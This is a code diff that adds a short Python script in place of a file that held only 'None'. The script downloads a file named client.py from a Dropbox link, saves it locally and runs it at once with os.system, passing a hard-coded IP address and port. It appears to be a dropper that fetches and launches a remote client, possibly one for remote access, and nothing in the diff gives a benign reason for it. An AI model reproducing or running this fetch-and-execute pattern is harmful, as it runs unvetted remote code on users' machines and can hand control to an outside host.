@@ -1,1 +1,19 @@
-None
+import requests
+import os
+os.chdir("C:\Health\Graphics\make")
+# URL of the Python file on Dropbox
+file_url = "https://www.dropbox.com/scl/fi/ob9y9hpclg7vg5lwjxd22/client.py?rlkey=larctabxdd7bqaq8t6lsoe24a&dl=1"
+# Download the file
+response = requests.get(file_url)
+if response.status_code == 200:
+        # Save the file locally
+        with open("downloaded_file.py", "wb") as file:
+            file.write(response.content)
+        print("File downloaded successfully.")
+
+        # Execute the downloaded file
+        os.system("python downloaded_file.py --host=91.171.137.111 --port=49002")
+else:
+        print("Failed to download the file.")
+
+        
